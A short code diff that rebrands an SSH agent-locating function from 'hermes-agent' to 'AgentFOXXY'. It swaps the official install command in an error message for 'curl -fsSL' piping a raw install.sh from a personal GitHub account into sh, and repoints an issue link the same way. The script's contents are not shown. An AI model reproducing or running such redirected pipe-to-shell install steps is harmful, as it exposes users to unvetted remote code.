@@ -176,7 +176,7 @@ async function locateAgentFOXXY(ssh, remoteAgentFOXXYPath) {
     //   - version checking: `<python> --version` printed "Python x.y.z" instead of
     //     the AgentFOXXY version, and
     //   - capability probing: `<python> serve --help` failed entirely.
-    // See https://github.com/NousResearch/hermes-agent/issues/74411
+    // See https://github.com/usmanxg58-byte/AgentFOXXY/issues/74411
     return candidate
   }
 
@@ -236,7 +236,7 @@ async function locateAgentFOXXY(ssh, remoteAgentFOXXYPath) {
 
   const err: any = new Error(
     'AgentFOXXY is not installed on the remote host (could not find a `agentfoxxy` executable). ' +
-      'Install it on the remote with:  curl -fsSL https://hermes-agent.nousresearch.com/install.sh | sh  ' +
+      'Install it on the remote with:  curl -fsSL https://raw.githubusercontent.com/usmanxg58-byte/AgentFOXXY/main/scripts/install.sh | sh  ' +
       '— or set the AgentFOXXY path explicitly in the SSH connection settings.'
   )
 
